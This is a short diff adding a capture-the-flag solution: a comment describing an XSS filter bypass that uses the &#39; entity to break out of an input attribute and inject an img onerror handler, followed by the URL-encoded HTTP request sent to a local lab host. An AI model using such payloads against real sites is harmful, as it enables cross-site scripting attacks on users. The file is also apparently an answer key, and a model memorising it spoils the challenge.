@@ -1,0 +1,4 @@
+# Bypasses single-quote filter using HTML entity &#39; for apostrophe. Breaks out of input value attribute and injects img onerror handler. Yields CTF flag.
+
+GET /page?name=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28%26%2339%3BXSS%26%2339%3B%29%3E HTTP/1.1
+Host: 172.17.0.1:50509
